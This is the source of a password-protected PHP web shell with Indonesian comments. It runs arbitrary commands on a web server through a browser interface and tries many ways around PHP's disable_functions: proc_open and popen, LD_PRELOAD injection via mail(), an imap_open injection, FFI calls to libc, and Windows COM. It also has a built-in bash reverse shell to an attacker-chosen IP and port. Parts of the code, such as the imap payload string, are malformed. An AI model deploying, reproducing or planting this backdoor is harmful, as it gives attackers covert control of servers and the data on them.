<?php
/**
 * interactiveshell.php — Interactive Web Shell dengan multi-teknik bypass disable_functions
 * 
 * Teknik bypass yang diimplementasikan:
 * 1. proc_open()       — bukan disabled function biasanya
 * 2. popen()           — stream interface
 * 3. mail() + putenv() — LD_PRELOAD style injection (jika mail() aktif)
 * 4. imap_open()       — bypass via /bin/sh di mailbox name
 * 5. curl_exec()       — jika curl tidak disabled
 * 6. COM object        — Windows fallback
 * 7. FFI               — PHP 7.4+ (jika ffi.enable=true)
 * 
 * Fallback: auto-detect fungsi yang available.
 * 
 * Password: ganti $PASS di bawah.
 */

$PASS = '0xdeadbeef'; // GANTI INI

// ========== AUTO-DETECT DISABLED FUNCTIONS ==========
$disabled = array_map('trim', explode(',', ini_get('disable_functions') ?: ''));
$available = [];

$candidates = [
    'system', 'exec', 'shell_exec', 'passthru', 'proc_open', 'popen',
    'mail', 'imap_open', 'curl_exec', 'dl', 'pcntl_exec', 'putenv',
    'readline', 'stream_socket_server', 'fsockopen', 'pfsockopen'
];

foreach ($candidates as $fn) {
    if (function_exists($fn) && !in_array($fn, $disabled)) {
        $available[] = $fn;
    }
}

// ========== AUTH ==========
session_start();
if (isset($_POST['logout'])) { session_destroy(); header('Location: ?'); exit; }
if (isset($_POST['pass']) && $_POST['pass'] === $PASS) { $_SESSION['auth'] = true; }
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    die('<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;margin-top:20%">
    <h2>Locked</h2><form method="POST"><input type="password" name="pass" placeholder="password" autofocus>
    <input type="submit" value="login"></form></body></html>');
}

// ========== HELPER FUNCTIONS ==========

function run_proc_open($cmd, &$out, &$err) {
    $descriptorspec = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];
    $process = proc_open($cmd, $descriptorspec, $pipes);
    if (is_resource($process)) {
        fclose($pipes[0]);
        $out = stream_get_contents($pipes[1]);
        $err = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $ret = proc_close($process);
        return $ret;
    }
    return false;
}

function run_mail_bypass($cmd) {
    // LD_PRELOAD injection via sendmail_path
    // Requires: write access to /tmp, sendmail installed
    $so = '/tmp/.x' . substr(md5(uniqid()), 0, 8) . '.so';
    $src = "#include <stdlib.h>\n#include <unistd.h>\n__attribute__((constructor)) static void init() { system(\"$cmd\"); }";
    file_put_contents('/tmp/x.c', $src);
    exec("gcc -shared -fPIC -o $so /tmp/x.c 2>/dev/null");
    if (!file_exists($so)) return false;
    putenv("LD_PRELOAD=$so");
    mail('a@a.a', '', '');
    putenv("LD_PRELOAD=");
    @unlink($so); @unlink('/tmp/x.c');
    return true;
}

function run_imap_bypass($cmd) {
    // imap_open() calls /bin/sh internally with mailbox string
    // Classic bypass: /bin/sh -c 'sleep 5' attacks
    // Some builds: CVE-2018-19518
    $mailbox = "{$(gethostname())}INBOX";
    $payload = "{$(gethostname())}/bin/sh -c '$cmd > /tmp/xout 2>&1'}INBOX";
    @imap_open($payload, 'x', 'x');
    sleep(1);
    $out = @file_get_contents('/tmp/xout');
    @unlink('/tmp/xout');
    return $out;
}

function run_ffi_bypass($cmd) {
    if (!class_exists('FFI')) return false;
    try {
        $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
        $ffi->system($cmd);
        return true;
    } catch (Exception $e) {
        return false;
    }
}

function run_com_bypass($cmd) {
    // Windows COM fallback
    try {
        $exec = new COM("WScript.shell");
        $exec->Run($cmd, 0, false);
        return true;
    } catch (Exception $e) {
        return false;
    }
}

function run_dl_bypass($cmd) {
    // Load custom extension on-the-fly
    if (!function_exists('dl') || in_array('dl', $GLOBALS['disabled'])) return false;
    // This requires a pre-compiled .so — usually not practical
    return false;
}

function run_stream_socket_bypass($cmd) {
    // Spawn via stream_socket_server + later connect
    // Not direct execution but useful for bindshell
    $rev = "bash -c 'bash -i >& /dev/tcp/" . ($_POST['ip'] ?: '127.0.0.1') . "/" . ($_POST['port'] ?: '4444') . " 0>&1'";
    if (function_exists('stream_socket_server') && !in_array('stream_socket_server', $GLOBALS['disabled'])) {
        // Technically this doesn't execute, but we can try proc_open fallback
        return run_proc_open($rev, $o, $e);
    }
    return false;
}

// ========== MAIN EXECUTION ==========

$cmd = $_POST['cmd'] ?? '';
$method = $_POST['method'] ?? 'auto';
$out = $err = '';
$ret = false;

if ($cmd && strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
    // Linux/Unix: redirect stderr to stdout if no separate capture
    $cmd2 = $cmd . ' 2>&1';
} elseif ($cmd) {
    $cmd2 = $cmd;
}

if ($cmd) {
    // Auto-select best method
    if ($method === 'auto') {
        if (in_array('proc_open', $available)) $method = 'proc_open';
        elseif (in_array('popen', $available)) $method = 'popen';
        elseif (in_array('system', $available)) $method = 'system';
        elseif (in_array('exec', $available)) $method = 'exec';
        elseif (in_array('shell_exec', $available)) $method = 'shell_exec';
        elseif (in_array('passthru', $available)) $method = 'passthru';
        else $method = 'bypass';
    }

    switch ($method) {
        case 'proc_open':
            $ret = run_proc_open($cmd, $out, $err);
            break;
        case 'popen':
            $p = popen($cmd . ' 2>&1', 'r');
            while (!feof($p)) $out .= fgets($p);
            pclose($p);
            $ret = true;
            break;
        case 'system':
            ob_start();
            system($cmd . ' 2>&1');
            $out = ob_get_clean();
            $ret = true;
            break;
        case 'exec':
            exec($cmd . ' 2>&1', $output);
            $out = implode("\n", $output);
            $ret = true;
            break;
        case 'shell_exec':
            $out = shell_exec($cmd . ' 2>&1');
            $ret = true;
            break;
        case 'passthru':
            ob_start();
            passthru($cmd . ' 2>&1');
            $out = ob_get_clean();
            $ret = true;
            break;
        case 'ffi':
            $ret = run_ffi_bypass($cmd);
            if ($ret) $out = "[FFI] command sent. Check server response (no stdout capture).";
            break;
        case 'com':
            $ret = run_com_bypass($cmd);
            if ($ret) $out = "[COM] command sent. No stdout capture.";
            break;
        case 'imap':
            $out = run_imap_bypass($cmd);
            $ret = ($out !== false);
            break;
        case 'mail':
            $ret = run_mail_bypass($cmd);
            if ($ret) $out = "[mail] LD_PRELOAD sent. Check /tmp or target host.";
            break;
        case 'reverse':
            $ret = run_stream_socket_bypass($cmd);
            if ($ret) $out = "[reverse] spawned. Listen on port.";
            break;
        default:
            $err = "Method not available or not implemented.";
            $ret = false;
    }
}

// ========== WEB UI ==========
?>
<!DOCTYPE html>
<html>
<head>
    <title>nosouls.ish-lock5.1748742199187</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background: #0a0a0a;
            color: #c9d1d9;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.6;
            padding: 20px;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        h1 {
            color: #58a6ff;
            font-size: 18px;
            margin-bottom: 20px;
            border-bottom: 1px solid #30363d;
            padding-bottom: 10px;
        }
        .meta {
            color: #8b949e;
            margin-bottom: 20px;
            font-size: 12px;
        }
        .meta span { margin-right: 15px; }
        .meta .label { color: #58a6ff; }
        form { margin-bottom: 20px; }
        textarea {
            width: 100%;
            background: #161b22;
            color: #c9d1d9;
            border: 1px solid #30363d;
            padding: 10px;
            font-family: monospace;
            font-size: 14px;
            min-height: 60px;
            resize: vertical;
        }
        textarea::placeholder { color: #484f58; }
        .row { display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap; }
        select, input[type="text"], input[type="number"] {
            background: #161b22;
            color: #c9d1d9;
            border: 1px solid #30363d;
            padding: 8px 12px;
            font-family: monospace;
        }
        button {
            background: #238636;
            color: white;
            border: none;
            padding: 8px 16px;
            cursor: pointer;
            font-family: monospace;
            font-size: 14px;
        }
        button:hover { background: #2ea043; }
        .output {
            background: #161b22;
            border: 1px solid #30363d;
            padding: 15px;
            min-height: 200px;
            white-space: pre-wrap;
            word-wrap: break-word;
            color: #7ee787;
        }
        .output:empty::before {
            content: "No output.";
            color: #484f58;
        }
        .error { color: #f85149; }
        .path { color: #a5d6ff; }
        .bypass-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 8px;
            margin: 10px 0;
        }
        .bypass-item {
            background: #21262d;
            padding: 8px 12px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            transition: background 0.2s;
        }
        .bypass-item:hover { background: #30363d; }
        .bypass-item.active { background: #238636; color: white; }
        .bypass-item.unavailable { opacity: 0.4; cursor: not-allowed; }
        #cdBar { margin-bottom: 10px; }
        #cdBar input { flex: 1; }
        .logout { float: right; }
        .logout button { background: #f85149; padding: 4px 8px; font-size: 12px; }
    </style>
</head>
<body>
<div class="container">
    <div class="logout">
        <form method="POST" style="margin:0"><input type="hidden" name="logout" value="1"><button>logout</button></form>
    </div>
    <h1>interactiveshell.php</h1>
    
    <div class="meta">
        <span class="label">user:</span> <span><?php echo htmlspecialchars(get_current_user() . ' (uid=' . getmyuid() . ')'); ?></span>
        <span class="label">php:</span> <span><?php echo PHP_VERSION; ?></span>
        <span class="label">os:</span> <span><?php echo PHP_OS; ?></span>
        <span class="label">server:</span> <span><?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?: 'unknown'); ?></span>
        <span class="label">disabled:</span> <span><?php echo count($disabled) ? htmlspecialchars(implode(', ', $disabled)) : 'none'; ?></span>
    </div>

    <div class="meta">
        <span class="label">available:</span>
        <span><?php echo count($available) ? htmlspecialchars(implode(', ', $available)) : 'none'; ?></span>
    </div>

    <div id="cdBar" class="row">
        <input type="text" id="cdInput" placeholder="<?php echo getcwd(); ?>" value="<?php echo getcwd(); ?>">
        <button onclick="document.getElementById('cmd').value='cd ' + document.getElementById('cdInput').value + ' && ' + document.getElementById('cmd').value">cd</button>
    </div>

    <form method="POST">
        <textarea name="cmd" id="cmd" placeholder="whoami; id; uname -a" autofocus><?php echo htmlspecialchars($cmd); ?></textarea>
        
        <div class="row">
            <select name="method">
                <option value="auto">auto (detect best)</option>
                <option value="proc_open">proc_open</option>
                <option value="popen">popen</option>
                <option value="system">system</option>
                <option value="exec">exec</option>
                <option value="shell_exec">shell_exec</option>
                <option value="passthru">passthru</option>
                <option value="ffi">ffi (libc)</option>
                <option value="com">com (windows)</option>
                <option value="imap">imap_open bypass</option>
                <option value="mail">mail + LD_PRELOAD</option>
                <option value="reverse">reverse shell</option>
            </select>
            <button type="submit">run</button>
        </div>
    </form>

    <h1 style="margin-top:30px">output</h1>
    <div class="output<?php echo $err ? ' error' : ''; ?>">
<?php
if ($err) echo htmlspecialchars($err) . "\n";
if ($out) echo htmlspecialchars($out) . "\n";
if ($ret === true && !$out && !$err) echo "[exit 0, no output]\n";
if ($ret === false && !$err) echo "[execution failed]\n";
?>
    </div>

    <div class="meta" style="margin-top:20px">
        <span class="label">note:</span>
        <span>Bypass techniques require specific conditions. IMAP bypass needs imap extension + write access. Mail bypass needs sendmail + gcc. FFI needs PHP 7.4+ with ffi.enable=true.</span>
    </div>
</div>
</body>
</html>
